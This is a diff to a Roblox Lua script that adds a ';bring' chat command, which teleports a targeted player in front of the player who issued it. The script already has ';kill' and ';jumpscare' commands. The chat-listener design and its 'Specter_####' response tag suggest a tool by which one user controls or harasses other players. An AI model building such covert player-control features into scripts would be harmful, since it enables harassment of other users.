@@ -37,6 +37,7 @@ local BIO_COMMAND      = ";bio"
 local CH_COMMAND       = ";ch"
 local JUMPSCARE_COMMAND = ";jumpscare"
 local KILL_COMMAND = ";kill"
+local BRING_COMMAND = ";bring"
 
 local RESPONSE_MESSAGE = "Specter_####"
 
@@ -164,6 +165,22 @@ local function killPlayer(target)
     end
 end
 
+--// ================== BRING ==================
+local function bringPlayer(adminPlayer, target)
+    if not adminPlayer or not target then return end
+    if not adminPlayer.Character or not target.Character then return end
+
+    local adminRoot = adminPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
+
+    if adminRoot and targetRoot then
+        -- traz o player para frente do admin
+        targetRoot.CFrame = adminRoot.CFrame * CFrame.new(0, 0, -3)
+    end
+end
+
+
+
 --// ================== LISTENER ==================
 verifier.chatConnection = generalChannel.MessageReceived:Connect(function(msg)
     if not msg or not msg.TextSource then return end
@@ -269,5 +286,20 @@ verifier.chatConnection = generalChannel.MessageReceived:Connect(function(msg)
         end
         return
     end
+    
+    -- ;bring
+    if lower:sub(1, #BRING_COMMAND) == BRING_COMMAND then
+        local rest = trim(text:sub(#BRING_COMMAND + 2))
+        local target = findPlayerByPartialName(rest)
+    
+        -- player que digitou o comando (ADMIN)
+        local adminPlayer = Players:GetPlayerByUserId(msg.TextSource.UserId)
+    
+        if adminPlayer and canTarget(target) then
+            bringPlayer(adminPlayer, target)
+        end
+        return
+    end
+
 
 end)
